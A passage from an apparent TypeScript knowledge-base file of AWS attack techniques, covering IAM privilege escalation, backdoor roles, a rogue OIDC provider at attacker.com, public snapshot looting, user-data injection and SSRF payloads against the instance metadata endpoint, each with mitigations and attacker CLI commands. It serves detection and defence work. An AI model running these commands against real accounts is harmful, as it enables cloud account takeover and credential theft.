      "An attacker with iam:PutRolePolicy or iam:PutUserPolicy can attach an inline policy directly to a role or user. Inline policies are embedded in the principal and can grant broad permissions (e.g., Action: *, Resource: *), bypassing restrictions that might apply to managed policies. The attacker targets principals they control or can assume. Required permissions are iam:PutRolePolicy for roles or iam:PutUserPolicy for users.",
    services: ["IAM"],
    permissions: ["iam:PutRolePolicy", "iam:PutUserPolicy"],
    detectionIds: ["det-031", "det-032", "det-033", "det-034"],
    detectionStrategy:
      "IAM Inline Policy Injection can be detected by monitoring IAM policy modification API calls recorded in CloudTrail. The key events are PutRolePolicy and PutUserPolicy, which allow an attacker to attach inline policies to roles or users and grant excessive privileges. Detection should focus on: IAM policy modification activity, unexpected actors modifying policies, inline policies granting excessive permissions (e.g., Action \"*\", Resource \"*\"), and self-modification or privilege escalation behavior.",
    mitigations: ["Restrict PutRolePolicy/PutUserPolicy", "Use permission boundaries", "Monitor inline policy changes"],
    category: "privilege-escalation",
    commands: [
      "aws iam put-role-policy --role-name TargetRole --policy-name EscalationPolicy --policy-document file://policy.json",
      "aws iam put-user-policy --user-name TargetUser --policy-name EscalationPolicy --policy-document file://policy.json",
    ],
  },
  {
    id: "tech-set-default-policy-version",
    name: "IAM Set Default Policy Version",
    shortName: "Policy Version",
    description:
      "IAM managed policies can have multiple versions. Only the default version is in effect. An attacker with iam:SetDefaultPolicyVersion can roll back to an older version of a policy that has more permissive permissions. If a policy was previously tightened (e.g., a new version removed admin access), the attacker sets the older version as default to restore the broader permissions. This requires no new policy creation and can be done with a single API call. Required permission is iam:SetDefaultPolicyVersion on the target policy.",
    services: ["IAM"],
    permissions: ["iam:SetDefaultPolicyVersion"],
    detectionIds: [],
    mitigations: ["Restrict SetDefaultPolicyVersion", "Audit policy version changes", "Use AWS Config for policy compliance"],
    category: "privilege-escalation",
    commands: [
      "aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy",
      "aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy --version-id v1",
    ],
  },
  {
    id: "tech-delete-detach-policy",
    name: "IAM Policy Delete or Detach",
    shortName: "Policy Detach",
    description:
      "An attacker with iam:DetachUserPolicy, iam:DetachRolePolicy, or iam:DeleteUserPolicy can remove restrictive policies from principals they control or have compromised. Detaching a policy that limited the principal's permissions (e.g., a deny policy or permission boundary) immediately expands the effective permissions. Deleting an inline policy removes its restrictions. The attacker targets their own user or role, or principals they can modify. Required permissions include iam:DetachUserPolicy, iam:DetachRolePolicy, iam:DeleteUserPolicy, or iam:DeleteRolePolicy.",
    services: ["IAM"],
    permissions: ["iam:DeleteUserPolicy", "iam:DetachUserPolicy", "iam:DetachRolePolicy"],
    detectionIds: [],
    mitigations: ["Alert on policy detach/delete", "Use SCPs to protect critical policies", "Implement change management"],
    category: "privilege-escalation",
    commands: [
      "aws iam detach-user-policy --user-name TargetUser --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess",
      "aws iam delete-user-policy --user-name TargetUser --policy-name RestrictivePolicy",
    ],
  },
  {
    id: "tech-delete-permissions-boundary",
    name: "IAM Permissions Boundary Deletion",
    shortName: "Boundary Delete",
    description:
      "Permissions boundaries cap the maximum permissions a user or role can have. An attacker with iam:DeleteRolePermissionsBoundary or iam:DeleteUserPermissionsBoundary can remove the boundary from a principal, allowing it to use its full attached policy permissions without the boundary's restrictions. This is especially effective when the principal has broad managed policies attached but was constrained by a boundary. Required permissions are iam:DeleteRolePermissionsBoundary for roles or iam:DeleteUserPermissionsBoundary for users.",
    services: ["IAM"],
    permissions: ["iam:DeleteRolePermissionsBoundary", "iam:DeleteUserPermissionsBoundary"],
    detectionIds: [],
    mitigations: ["Restrict boundary deletion", "Monitor IAM boundary changes", "Use SCPs to enforce boundaries"],
    category: "privilege-escalation",
    commands: [
      "aws iam delete-role-permissions-boundary --role-name TargetRole",
      "aws iam delete-user-permissions-boundary --user-name TargetUser",
    ],
  },
  {
    id: "tech-put-permissions-boundary",
    name: "IAM Permissions Boundary Weakening",
    shortName: "Boundary Weaken",
    description:
      "An attacker with iam:PutRolePermissionsBoundary or iam:PutUserPermissionsBoundary can replace an existing permissions boundary with a weaker one. The new boundary may grant broader actions (e.g., s3:* instead of s3:GetObject only) or cover more resources. This effectively escalates the principal's permissions without modifying attached policies. Required permissions are iam:PutRolePermissionsBoundary for roles or iam:PutUserPermissionsBoundary for users.",
    services: ["IAM"],
    permissions: ["iam:PutRolePermissionsBoundary", "iam:PutUserPermissionsBoundary"],
    detectionIds: [],
    mitigations: ["Restrict boundary modifications", "Audit boundary changes", "Use least-privilege boundaries"],
    category: "privilege-escalation",
    commands: [
      "aws iam put-role-permissions-boundary --role-name TargetRole --permissions-boundary arn:aws:iam::aws:policy/WeakBoundary",
      "aws iam put-user-permissions-boundary --user-name TargetUser --permissions-boundary arn:aws:iam::aws:policy/WeakBoundary",
    ],
  },
  {
    id: "tech-create-login-profile",
    name: "IAM Create Login Profile",
    shortName: "Login Profile",
    description:
      "An attacker with iam:CreateLoginProfile can set a password for an IAM user, enabling AWS Management Console access. This is used for persistence when the attacker has created a backdoor user or compromised an existing user that lacked console access. The attacker can then log in via the web console in addition to programmatic access. Required permission is iam:CreateLoginProfile. The target user must not already have a login profile.",
    services: ["IAM"],
    permissions: ["iam:CreateLoginProfile"],
    detectionIds: [],
    mitigations: ["Restrict CreateLoginProfile", "Prefer SSO over IAM user console", "Monitor login profile creation"],
    category: "privilege-escalation",
    commands: [
      "aws iam create-login-profile --user-name backdoor-user --password 'P@ssw0rd123!' --password-reset-required",
    ],
  },
  {
    id: "tech-update-login-profile",
    name: "IAM Update Login Profile",
    shortName: "Update Login",
    description:
      "An attacker with iam:UpdateLoginProfile can change the password of an IAM user that has a login profile. This allows the attacker to set a known password on a compromised or backdoor user to maintain or regain console access. If the user's password was rotated during incident response, the attacker can set a new one. Required permission is iam:UpdateLoginProfile on the target user.",
    services: ["IAM"],
    permissions: ["iam:UpdateLoginProfile"],
    detectionIds: [],
    mitigations: ["Restrict UpdateLoginProfile", "Enable MFA", "Monitor login profile changes"],
    category: "privilege-escalation",
    commands: [
      "aws iam update-login-profile --user-name TargetUser --password 'NewP@ssw0rd!'",
    ],
  },
  {
    id: "tech-add-user-to-group",
    name: "IAM Add User to Group",
    shortName: "Add to Group",
    description:
      "An attacker with iam:AddUserToGroup can add a user (themselves or a backdoor user) to an IAM group that has elevated permissions. Group membership grants the user all permissions attached to the group's policies. If the attacker finds a group with broad access (e.g., AdminGroup), adding their user immediately escalates privileges. Required permission is iam:AddUserToGroup. The attacker must have a user to add and the group must exist.",
    services: ["IAM"],
    permissions: ["iam:AddUserToGroup"],
    detectionIds: [],
    mitigations: ["Restrict AddUserToGroup", "Audit group membership", "Use least-privilege groups"],
    category: "privilege-escalation",
    commands: [
      "aws iam add-user-to-group --user-name compromised-user --group-name AdminGroup",
    ],
  },
  {
    id: "tech-create-backdoor-role",
    name: "IAM Backdoor Role Creation",
    shortName: "Backdoor Role",
    description:
      "An attacker with iam:CreateRole and iam:AttachRolePolicy creates a new IAM role with a trust policy that allows their principal (e.g., attacker account root or a specific user) to assume it. They attach high-privilege policies to the role. The attacker can then assume this role at any time for persistent access. This survives key rotation because it relies on role assumption rather than stored credentials. Required permissions are iam:CreateRole and iam:AttachRolePolicy (or iam:PutRolePolicy for inline policies).",
    services: ["IAM"],
    permissions: ["iam:CreateRole", "iam:AttachRolePolicy"],
    detectionIds: [],
    mitigations: ["Restrict role creation", "Audit new roles", "Use SCPs to limit role creation"],
    category: "persistence",
    commands: [
      "aws iam create-role --role-name BackdoorRole --assume-role-policy-document file://trust-policy.json",
      "aws iam attach-role-policy --role-name BackdoorRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    ],
  },
  {
    id: "tech-passrole-ec2",
    name: "PassRole via EC2 RunInstances",
    shortName: "PassRole EC2",
    description:
      "An attacker with iam:PassRole and ec2:RunInstances launches a new EC2 instance with an IAM instance profile that has a high-privilege role. The instance profile is specified via the IamInstanceProfile parameter. Once the instance is running, the attacker accesses it (via SSM, user data exfiltration, or if they have network access) and queries the Instance Metadata Service to retrieve the role's temporary credentials. Required permissions are iam:PassRole for the instance profile role and ec2:RunInstances.",
    services: ["IAM", "EC2"],
    permissions: ["iam:PassRole", "ec2:RunInstances"],
    detectionIds: [],
    mitigations: ["Restrict PassRole to specific role ARNs", "Limit RunInstances to approved AMIs", "Use permission boundaries"],
    category: "privilege-escalation",
    commands: [
      "aws ec2 run-instances --image-id ami-xxxxx --instance-type t2.micro --iam-instance-profile Name=AdminInstanceProfile",
    ],
  },
  {
    id: "tech-passrole-ecs",
    name: "PassRole via ECS RunTask",
    shortName: "PassRole ECS",
    description:
      "An attacker with iam:PassRole and ecs:RunTask runs an ECS task with a privileged task role. The task role is specified in the task definition. The attacker uses a task definition that runs a container they control (or one that exposes credentials). When the task runs, it receives the task role's credentials via the container metadata endpoint. The attacker's code exfiltrates these credentials. Required permissions are iam:PassRole for the task role and ecs:RunTask. The attacker may need ecs:RegisterTaskDefinition to create a custom task definition.",
    services: ["IAM", "ECS"],
    permissions: ["iam:PassRole", "ecs:RunTask"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for ECS", "Use task execution role separation", "Audit RunTask with custom roles"],
    category: "privilege-escalation",
    commands: [
      "aws ecs run-task --cluster prod --task-definition backdoor-task:1 --launch-type FARGATE --network-configuration 'awsvpcConfiguration={subnets=[subnet-xxx]}'",
    ],
  },
  {
    id: "tech-passrole-cloudformation",
    name: "PassRole via CloudFormation",
    shortName: "PassRole CFN",
    description:
      "An attacker with iam:PassRole and cloudformation:CreateStack deploys a CloudFormation stack whose template creates resources (e.g., Lambda functions, EC2 instances) with a privileged IAM role. The stack template specifies the role ARN in resource properties. When the stack is created, those resources run with the passed role's permissions. The attacker can then invoke the Lambda or access the EC2 instance to use the escalated credentials. Required permissions are iam:PassRole and cloudformation:CreateStack. The template must be valid and create resources that use the role.",
    services: ["IAM", "CloudFormation"],
    permissions: ["iam:PassRole", "cloudformation:CreateStack"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for CloudFormation", "Validate stack templates", "Use change management"],
    category: "privilege-escalation",
    commands: [
      "aws cloudformation create-stack --stack-name backdoor-stack --template-body file://malicious-template.yaml --capabilities CAPABILITY_NAMED_IAM",
    ],
  },
  {
    id: "tech-passrole-glue",
    name: "PassRole via Glue Dev Endpoint",
    shortName: "PassRole Glue",
    description:
      "An attacker with iam:PassRole and glue:CreateDevEndpoint creates a Glue development endpoint, which is an EC2 instance that runs the Glue environment. The endpoint has an IAM role attached. The attacker uses glue:UpdateDevEndpoint to add their SSH public key to the endpoint. They then SSH into the endpoint and query the Instance Metadata Service to retrieve the role's credentials. Required permissions are iam:PassRole, glue:CreateDevEndpoint, and glue:UpdateDevEndpoint.",
    services: ["IAM", "Glue"],
    permissions: ["iam:PassRole", "glue:CreateDevEndpoint"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Glue", "Limit dev endpoint creation", "Audit Glue dev endpoints"],
    category: "privilege-escalation",
    commands: [
      "aws glue create-dev-endpoint --endpoint-name backdoor-endpoint --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --number-of-nodes 1",
      "aws glue update-dev-endpoint --endpoint-name backdoor-endpoint --public-keys 'ssh-rsa AAAA...'",
    ],
  },
  {
    id: "tech-passrole-autoscaling",
    name: "PassRole via Auto Scaling",
    shortName: "PassRole ASG",
    description:
      "An attacker with iam:PassRole and autoscaling:CreateLaunchConfiguration creates a launch configuration that specifies an IAM instance profile with a privileged role. When instances are launched (via an Auto Scaling group or manually using the launch configuration), they receive the role's credentials via IMDS. The attacker may create an Auto Scaling group with min/max 1 to launch a single instance, or attach the launch config to an existing group. Required permissions are iam:PassRole and autoscaling:CreateLaunchConfiguration.",
    services: ["IAM", "Auto Scaling"],
    permissions: ["iam:PassRole", "autoscaling:CreateLaunchConfiguration"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Auto Scaling", "Audit launch configurations", "Use least-privilege launch roles"],
    category: "privilege-escalation",
    commands: [
      "aws autoscaling create-launch-configuration --launch-configuration-name backdoor-lc --image-id ami-xxxxx --instance-type t2.micro --iam-instance-profile AdminProfile",
    ],
  },
  {
    id: "tech-passrole-agentcore",
    name: "Bedrock AgentCore Role Confusion",
    shortName: "AgentCore Role",
    description:
      "Bedrock agents use IAM roles for execution. An attacker with iam:PassRole and bedrock:CreateAgent (or bedrock:UpdateAgent) can create or modify an agent to use a privileged role. When the agent is invoked, it executes with that role's permissions. The attacker can configure the agent to use a Lambda function they control, which runs with the agent role and can exfiltrate credentials or perform privileged actions. Required permissions are iam:PassRole and bedrock:CreateAgent or bedrock:UpdateAgent.",
    services: ["IAM", "Bedrock"],
    permissions: ["iam:PassRole", "bedrock:CreateAgent"],
    detectionIds: [],
    mitigations: ["Restrict PassRole for Bedrock", "Audit agent configurations", "Use dedicated agent roles"],
    category: "privilege-escalation",
    commands: [
      "aws bedrock create-agent --agent-name backdoor-agent --agent-resource-role-arn arn:aws:iam::ACCOUNT:role/AdminRole --foundation-model model-id",
    ],
  },
  {
    id: "tech-glue-dev-endpoint-update",
    name: "Glue Dev Endpoint SSH Key Update",
    shortName: "Glue SSH Key",
    description:
      "A Glue dev endpoint is an EC2 instance with an IAM role. An attacker with glue:UpdateDevEndpoint can add their SSH public key to the endpoint's authorized keys. They then SSH into the endpoint (using the Glue-provided connection details) and query the Instance Metadata Service to retrieve the endpoint's IAM role credentials. This works even if the attacker did not create the endpoint. Required permission is glue:UpdateDevEndpoint. The endpoint must be in a running state.",
    services: ["Glue", "IAM"],
    permissions: ["glue:UpdateDevEndpoint"],
    detectionIds: [],
    mitigations: ["Restrict UpdateDevEndpoint", "Audit dev endpoint changes", "Use VPC-restricted endpoints"],
    category: "privilege-escalation",
    commands: [
      "aws glue update-dev-endpoint --endpoint-name existing-endpoint --public-keys 'ssh-rsa AAAA...attacker-key'",
      "ssh -i attacker-key glue@glue-endpoint-xxx.region.glue.amazonaws.com",
    ],
  },
  {
    id: "tech-get-federation-token",
    name: "STS GetFederationToken Persistence",
    shortName: "Fed Token",
    description:
      "An attacker with sts:GetFederationToken creates federation tokens that are tied to their identity but have a configurable policy. Unlike AssumeRole credentials, federation tokens are not invalidated when the original access key is deleted or rotated. The attacker creates a token with broad permissions, stores the credentials, and uses them for persistent access. When the organization rotates keys or deletes the compromised user's keys, the federation token remains valid until it expires (up to 36 hours, but can be refreshed). Required permission is sts:GetFederationToken.",
    services: ["STS", "IAM"],
    permissions: ["sts:GetFederationToken"],
    detectionIds: [],
    mitigations: ["Restrict GetFederationToken", "Monitor federation token creation", "Prefer AssumeRole"],
    category: "persistence",
    commands: [
      "aws sts get-federation-token --name attacker-session --policy-document file://broad-policy.json",
    ],
  },
  {
    id: "tech-rogue-oidc-provider",
    name: "Rogue OIDC Identity Provider",
    shortName: "Rogue OIDC",
    description:
      "An attacker with iam:CreateOpenIDConnectProvider creates an OIDC identity provider that points to an attacker-controlled URL (e.g., https://attacker.com/.well-known/openid-configuration). If the attacker can also modify role trust policies (iam:UpdateAssumeRolePolicy), they add this provider as a trusted issuer. The attacker's IdP issues tokens that satisfy the trust policy. The attacker then assumes the role via sts:AssumeRoleWithWebIdentity. This creates persistence through a trusted identity source. Required permission is iam:CreateOpenIDConnectProvider; role modification may require additional permissions.",
    services: ["IAM"],
    permissions: ["iam:CreateOpenIDConnectProvider"],
    detectionIds: [],
    mitigations: ["Restrict CreateOpenIDConnectProvider", "Audit OIDC providers", "Use allowlists for IdP URLs"],
    category: "persistence",
    commands: [
      "aws iam create-open-id-connect-provider --url https://attacker.com --client-id-list sts.amazonaws.com",
    ],
  },
  {
    id: "tech-roles-anywhere-persistence",
    name: "IAM Roles Anywhere Persistence",
    shortName: "Roles Anywhere",
    description:
      "IAM Roles Anywhere allows workloads outside AWS to obtain temporary credentials using X.509 certificates. An attacker with rolesanywhere:CreateTrustAnchor and rolesanywhere:CreateProfile creates a trust anchor that trusts a certificate authority they control, and a profile that maps certificates to a privileged IAM role. The attacker uses a certificate from their CA to assume the role from any infrastructure (on-prem, another cloud). This provides persistence that does not rely on IAM users or access keys. Required permissions are rolesanywhere:CreateTrustAnchor and rolesanywhere:CreateProfile.",
    services: ["IAM", "Roles Anywhere"],
    permissions: ["rolesanywhere:CreateTrustAnchor", "rolesanywhere:CreateProfile"],
    detectionIds: [],
    mitigations: ["Restrict Roles Anywhere management", "Audit trust anchors", "Use certificate pinning"],
    category: "persistence",
    commands: [
      "aws rolesanywhere create-trust-anchor --name AttackerAnchor --source sourceData={x509CertificateData=...},sourceType=CERTIFICATE_BUNDLE",
      "aws rolesanywhere create-profile --name AttackerProfile --role-arns arn:aws:iam::ACCOUNT:role/AdminRole",
    ],
  },
  {
    id: "tech-codebuild-github-runner",
    name: "CodeBuild GitHub Runner Persistence",
    shortName: "CodeBuild Runner",
    description:
      "An attacker with codebuild:CreateProject and iam:PassRole creates a CodeBuild project configured to act as a GitHub Actions runner. When the organization's GitHub repository runs workflows, jobs can be routed to this CodeBuild project. The build runs with the CodeBuild service role's credentials, which may have broad permissions. The attacker modifies workflows (if they have repo access) or creates malicious workflows that exfiltrate credentials. This establishes persistence through the CI/CD pipeline. Required permissions are codebuild:CreateProject and iam:PassRole.",
    services: ["CodeBuild", "IAM"],
    permissions: ["codebuild:CreateProject", "iam:PassRole"],
    detectionIds: [],
    mitigations: ["Restrict CodeBuild project creation", "Audit GitHub integrations", "Use OIDC for GitHub Actions"],
    category: "persistence",
    commands: [
      "aws codebuild create-project --name github-runner --source type=GITHUB,location=https://github.com/org/repo --service-role arn:aws:iam::ACCOUNT:role/CodeBuildRole",
    ],
  },
  {
    id: "tech-ec2-userdata-disclosure",
    name: "EC2 User Data Disclosure",
    shortName: "UserData Leak",
    description:
      "EC2 user data can contain secrets, database connection strings, or bootstrap scripts. An attacker with ec2:DescribeInstanceAttribute (with attribute userData) or ec2:DescribeInstances can retrieve the user data of instances. The user data may be base64-encoded. Attackers look for embedded credentials, API keys, or scripts that reveal sensitive configuration. Required permissions are ec2:DescribeInstanceAttribute or ec2:DescribeInstances. The attacker must be able to target specific instance IDs.",
    services: ["EC2"],
    permissions: ["ec2:DescribeInstanceAttribute", "ec2:DescribeInstances"],
    detectionIds: [],
    mitigations: ["Avoid secrets in user data", "Use Secrets Manager", "Restrict DescribeInstanceAttribute"],
    category: "credential-access",
    commands: [
      "aws ec2 describe-instance-attribute --instance-id i-0abc123 --attribute userData",
      "aws ec2 describe-instances --instance-ids i-0abc123 --query 'Reservations[].Instances[].UserData'",
    ],
  },
  {
    id: "tech-ec2-userdata-injection",
    name: "EC2 User Data Injection",
    shortName: "UserData Inject",
    description:
      "An attacker with ec2:ModifyInstanceAttribute can change the user data of a running instance. User data is executed when the instance boots. By injecting a malicious script (e.g., one that creates a backdoor user, exfiltrates credentials, or installs a reverse shell), the attacker ensures the script runs on the next reboot. If the instance is in an Auto Scaling group, new instances may also receive the modified user data. Required permission is ec2:ModifyInstanceAttribute with the userData attribute.",
    services: ["EC2"],
    permissions: ["ec2:ModifyInstanceAttribute"],
    detectionIds: [],
    mitigations: ["Restrict ModifyInstanceAttribute", "Use immutable instances", "Monitor user data changes"],
    category: "privilege-escalation",
    commands: [
      "aws ec2 modify-instance-attribute --instance-id i-0abc123 --user-data fileb://malicious-script.sh",
    ],
  },
  {
    id: "tech-external-imds-ssrf",
    name: "External IMDS SSRF (No Credentials)",
    shortName: "IMDS SSRF",
    description:
      "A web application vulnerable to Server-Side Request Forgery (SSRF) can be tricked into making HTTP requests to the EC2 Instance Metadata Service at 169.254.169.254. If the app runs on EC2 and uses IMDSv1, an attacker can inject a URL that causes the server to fetch its own IAM role credentials and return them in the response. No AWS credentials are required; the attacker only needs to find an SSRF vulnerability in a publicly accessible app. The attacker crafts a request (e.g., via a callback URL or image src) pointing to the metadata endpoint.",
    services: ["EC2", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Enforce IMDSv2", "Fix SSRF vulnerabilities", "Use VPC endpoints for metadata"],
    category: "credential-access",
    commands: [
      "Inject URL in vulnerable parameter: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "Or: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
    ],
    references: [
      { source: "Hacking the Cloud", url: "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/" },
      { source: "CloudGoat", url: "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/cloud_breach_s3.md" },
    ],
  },
  {
    id: "tech-ssm-session",
    name: "SSM Session Manager Access",
    shortName: "SSM Session",
    description:
      "An attacker with ssm:StartSession can establish an interactive shell session to EC2 instances that have the SSM agent and are registered with Systems Manager. No SSH keys or open port 22 are required. The session runs through the SSM service. The attacker gains the same access as the instance's OS user (often ec2-user or Administrator). Instances must have the appropriate IAM instance profile and be in the SSM managed instance inventory. Required permission is ssm:StartSession.",
    services: ["SSM", "EC2"],
    permissions: ["ssm:StartSession"],
    detectionIds: [],
    mitigations: ["Restrict StartSession", "Enable session logging", "Use least-privilege instance profiles"],
    category: "lateral-movement",
    commands: [
      "aws ssm start-session --target i-0abc123def456",
    ],
  },
  {
    id: "tech-ssm-via-tags",
    name: "SSM Access via CreateTags Bypass",
    shortName: "SSM CreateTags",
    description:
      "SSM Session Manager access can be restricted via resource tags (e.g., only principals with tag Key=SSMAccess,Value=true can start sessions on instances with matching tags). An attacker with ec2:CreateTags or ssm:AddTagsToResource adds the required tags to target instances, satisfying the session policy. They then use ssm:StartSession to gain shell access. This bypasses tag-based access controls. Required permissions are ec2:CreateTags or ssm:AddTagsToResource, plus ssm:StartSession.",
    services: ["SSM", "EC2"],
    permissions: ["ssm:AddTagsToResource", "ec2:CreateTags", "ssm:StartSession"],
    detectionIds: ["det-029"],
    mitigations: ["Restrict CreateTags on EC2/SSM", "Use resource policies", "Audit tag changes"],
    category: "lateral-movement",
    commands: [
      "aws ec2 create-tags --resources i-0abc123 --tags Key=SSMAccess,Value=true",
      "aws ssm start-session --target i-0abc123",
    ],
  },
  {
    id: "tech-volume-snapshot-loot",
    name: "EC2 Volume Snapshot Loot",
    shortName: "Snapshot Loot",
    description:
      "An attacker with ec2:CreateSnapshot creates a snapshot of an EC2 instance's EBS volume (root or data). They use ec2:ModifySnapshotAttribute to share the snapshot with their account or make it temporarily public. In their account, they use ec2:CopySnapshot and ec2:CreateVolume to create a volume from the snapshot, attach it to an instance they control, mount it, and extract credentials (e.g., from ~/.aws/credentials) or sensitive data. Unencrypted volumes are fully readable. Required permissions include ec2:CreateSnapshot, ec2:ModifySnapshotAttribute, and ec2:CopySnapshot.",
    services: ["EC2"],
    permissions: ["ec2:CreateSnapshot", "ec2:ModifySnapshotAttribute", "ec2:CreateVolume"],
    detectionIds: [],
    mitigations: ["Restrict snapshot creation", "Encrypt volumes", "Monitor cross-account snapshot sharing"],
    category: "credential-access",
    commands: [
      "aws ec2 create-snapshot --volume-id vol-0abc123 --description 'Loot'",
      "aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --group-names all",
      "aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-xxx --destination-region us-east-1",
    ],
  },
  {
    id: "tech-public-snapshot-loot",
    name: "Public EBS Snapshot Loot",
    shortName: "Public Snapshot",
    description:
      "Organizations sometimes share EBS snapshots publicly for collaboration or backup. An attacker uses ec2:DescribeSnapshots to find snapshots with createVolumePermission for 'all' or specific accounts. They use ec2:CopySnapshot to copy the snapshot to their account, create a volume, attach and mount it, and extract data. Unencrypted snapshots expose all volume contents including credentials and application data. No permissions in the source account are required; only the ability to copy public snapshots in the attacker's account.",
    services: ["EC2"],
    permissions: ["ec2:CopySnapshot", "ec2:DescribeSnapshots"],
    detectionIds: [],
    mitigations: ["Avoid public snapshots", "Encrypt all volumes", "Use SCPs to block public sharing"],
    category: "credential-access",
    commands: [
      "aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[?State==`completed`]'",
      "aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id snap-xxx",
    ],
  },
  {
    id: "tech-ec2-password-data",
    name: "EC2 Get Password Data (Windows)",
    shortName: "Password Data",
    description:
      "Windows EC2 instances can have their initial administrator password retrieved via ec2:GetPasswordData. The password is encrypted with the key pair used to launch the instance. An attacker with ec2:GetPasswordData and the private key can decrypt the password and use it for RDP access. This works for instances launched with a key pair; the password is available a few minutes after boot. Required permissions are ec2:GetPasswordData. The attacker must have the private key file corresponding to the instance's key pair.",
    services: ["EC2"],
    permissions: ["ec2:GetPasswordData"],
    detectionIds: [],
    mitigations: ["Restrict GetPasswordData", "Use SSM for credential retrieval", "Prefer Linux/SSM"],
    category: "credential-access",
    commands: [
      "aws ec2 get-password-data --instance-id i-0abc123",
      "Decrypt with: openssl rsautl -decrypt -inkey key.pem -in password.bin",
    ],
  },
  {
    id: "tech-ec2-instance-connect",
    name: "EC2 Instance Connect",
    shortName: "Instance Connect",
    description:
      "EC2 Instance Connect allows pushing a temporary SSH public key to an instance for 60 seconds. An attacker with ec2-instance-connect:SendSSHPublicKey specifies their public key and the instance ID. The key is added to the ec2-user's authorized_keys. The attacker then SSHes into the instance using their private key. The instance must have the EC2 Instance Connect agent and allow SSH (port 22) from the attacker's IP. Required permission is ec2-instance-connect:SendSSHPublicKey.",
    services: ["EC2"],
    permissions: ["ec2-instance-connect:SendSSHPublicKey"],
    detectionIds: [],
    mitigations: ["Restrict SendSSHPublicKey", "Use SSM Session Manager", "Audit instance connect usage"],
    category: "lateral-movement",
    commands: [
      "aws ec2-instance-connect send-ssh-public-key --instance-id i-0abc123 --instance-os-user ec2-user --ssh-public-key file://~/.ssh/id_rsa.pub",
      "ssh -i ~/.ssh/id_rsa ec2-user@ec2-xx-xx-xx-xx.compute.amazonaws.com",
    ],
  },
  {
    id: "tech-ec2-serial-console",
    name: "EC2 Serial Console Access",
    shortName: "Serial Console",
    description:
      "EC2 Serial Console provides direct serial port access to instances, bypassing network and SSH. An attacker with ec2-instance-connect:SendSerialConsoleSSHPublicKey can add their SSH key for serial console access. They connect via the EC2 Serial Console endpoint. This bypasses security groups, NACLs, and SSH configuration. Useful when the instance is otherwise unreachable. Serial console must be enabled at the account level. Required permission is ec2-instance-connect:SendSerialConsoleSSHPublicKey.",
    services: ["EC2"],
    permissions: ["ec2-instance-connect:SendSerialConsoleSSHPublicKey"],
    detectionIds: [],
    mitigations: ["Restrict serial console", "Audit serial console access", "Use account-level serial console settings"],
    category: "lateral-movement",
    commands: [
      "aws ec2-instance-connect send-serial-console-ssh-public-key --instance-id i-0abc123 --serial-port 0 --ssh-public-key file://~/.ssh/id_rsa.pub",
    ],
  },
  {
    id: "tech-security-group-open-22",
    name: "Security Group Port 22 Ingress",
    shortName: "SG Port 22",
    description:
      "An attacker with ec2:AuthorizeSecurityGroupIngress adds an ingress rule to a security group that allows SSH (port 22) from their IP address. This enables direct SSH access to instances that use that security group. The attacker may target a security group attached to multiple instances for broad access. Required permission is ec2:AuthorizeSecurityGroupIngress. The attacker needs the security group ID and their source IP (or a CIDR they control).",
    services: ["EC2"],
    permissions: ["ec2:AuthorizeSecurityGroupIngress"],
    detectionIds: [],
    mitigations: ["Restrict security group changes", "Use SSM instead of SSH", "Monitor ingress rule changes"],
    category: "lateral-movement",
    commands: [
      "aws ec2 authorize-security-group-ingress --group-id sg-0abc123 --protocol tcp --port 22 --cidr 203.0.113.50/32",
    ],
  },
  {
    id: "tech-efs-access-from-ec2",
    name: "EFS Access from EC2 (VPC)",
    shortName: "EFS from EC2",
    description:
      "An attacker with access to an EC2 instance in a VPC can mount EFS file systems that are accessible from that instance. They use elasticfilesystem:DescribeFileSystems and elasticfilesystem:DescribeMountTargets to discover EFS volumes. If the instance's security group allows NFS (port 2049) to the EFS mount targets, they mount the filesystem and access shared data. EFS access is controlled by security groups and IAM; the instance role may have EFS permissions. Required permissions include elasticfilesystem:DescribeFileSystems and network access to mount targets.",
    services: ["EFS", "EC2"],
    permissions: ["elasticfilesystem:DescribeFileSystems", "elasticfilesystem:DescribeMountTargets"],
    detectionIds: [],
    mitigations: ["Restrict EFS access via security groups", "Use encryption", "Audit EFS mount activity"],
    category: "lateral-movement",
    commands: [
      "aws efs describe-file-systems",
      "aws efs describe-mount-targets --file-system-id fs-0abc123",
      "sudo mount -t nfs -o nfsvers=4.1 fs-0abc123.efs.region.amazonaws.com:/ /mnt/efs",
    ],
  },
  {
    id: "tech-lambda-credential-theft",
    name: "Lambda Credential Theft via SSRF",
    shortName: "Lambda Cred Theft",
    description:
      "A Lambda function vulnerable to SSRF can be triggered with input that causes it to make HTTP requests to the Instance Metadata Service (169.254.169.254). Lambda runs on EC2-like infrastructure and has IMDS access. The function fetches its execution role credentials and may return them in the response or log them. The attacker triggers the Lambda (e.g., via a webhook or API) with malicious input. No AWS permissions are required if the Lambda is publicly invokable; otherwise the attacker needs lambda:InvokeFunction.",
    services: ["Lambda", "EC2", "IAM"],
    permissions: [],
    detectionIds: [],
    mitigations: ["Fix SSRF in Lambda code", "Use least-privilege roles", "Restrict outbound Lambda access"],
    category: "credential-access",
    commands: [
      "Trigger Lambda with SSRF payload: {\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
    ],
  },
  {
    id: "tech-lambda-config-update",
    name: "Lambda Configuration Update",
    shortName: "Lambda Config",
    description:
